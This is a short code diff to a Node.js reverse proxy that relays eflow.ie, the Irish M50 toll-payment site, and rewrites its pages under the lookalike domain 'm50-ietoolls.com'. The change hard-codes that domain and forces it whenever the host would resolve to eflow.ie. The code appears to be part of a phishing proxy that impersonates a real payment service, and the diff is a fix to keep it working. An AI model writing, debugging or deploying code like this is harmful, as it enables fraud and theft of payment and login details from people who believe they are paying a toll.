@@ -569,7 +569,21 @@ const proxyOptions = {
       const contentType = proxyRes.headers['content-type'] || '';
       const targetDomain = new URL(config.target.url).hostname; // eflow.ie
       // CRITICAL: Use PROXY_DOMAIN from env as primary source to avoid Nginx host header issues
-      const proxyDomain = process.env.PROXY_DOMAIN || req.get('host') || req.headers.host || 'm50-ietoolls.com';
+      // ВАЖНО: req.get('host') может вернуть eflow.ie из-за Nginx, поэтому НЕ используем его!
+      let proxyDomain = process.env.PROXY_DOMAIN || 'm50-ietoolls.com';
+      
+      // КРИТИЧНО: Проверяем, что proxyDomain правильный (не eflow.ie)
+      if (proxyDomain === 'eflow.ie' || proxyDomain.includes('eflow.ie')) {
+        logger.error(`[PROXY_DOMAIN] ERROR: proxyDomain is ${proxyDomain}, forcing to m50-ietoolls.com`);
+        proxyDomain = 'm50-ietoolls.com';
+      }
+      
+      // DEBUG: Логируем для диагностики
+      if (!process.env.PROXY_DOMAIN) {
+        logger.warn(`[PROXY_DOMAIN] PROXY_DOMAIN not set in env, using fallback: ${proxyDomain}`);
+      } else {
+        logger.info(`[PROXY_DOMAIN] Using PROXY_DOMAIN from env: ${proxyDomain}`);
+      }
       
       // DEBUG LOGGING
       logger.info(`[RESPONSE INTERCEPTOR] URL: ${req.url}, ContentType: ${contentType}, Status: ${proxyRes.statusCode}, Size: ${responseBuffer.length} bytes`);
